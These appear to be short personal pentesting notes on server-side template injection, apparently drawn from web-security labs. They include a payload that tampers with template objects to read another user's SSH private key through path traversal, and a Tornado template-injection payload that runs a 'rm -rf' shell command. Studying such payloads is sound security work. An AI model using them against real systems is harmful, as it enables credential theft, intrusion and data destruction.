- In real world, Most of the times you won't be able to get RCE, but you can tamper with object data. So you may perfom privilege escalation within the website.
```php
user.isAdmin = True # Tamper with attritube
user.gdprDelete()   # Check the available methods
user.setAvatar('../../../home/carlos/.ssh/id_rsa','image/png')
```
- **Handlebars**, No arithmetic,operators, function calls, filters, it only support Literals, Variable lookup, Helpers (functions explicitly registered by the app).
- If you found code context parameters like `display=user.email` try to change it, then try to break the SSTI syntax.
```js
display=user.name}}{%import subprocess%}{{subprocess.call("rm -rf morale.txt",shell=True)

// It actual code is, keep in mind code is in python (tornedo)
show = {{ USER_INPUT }}
```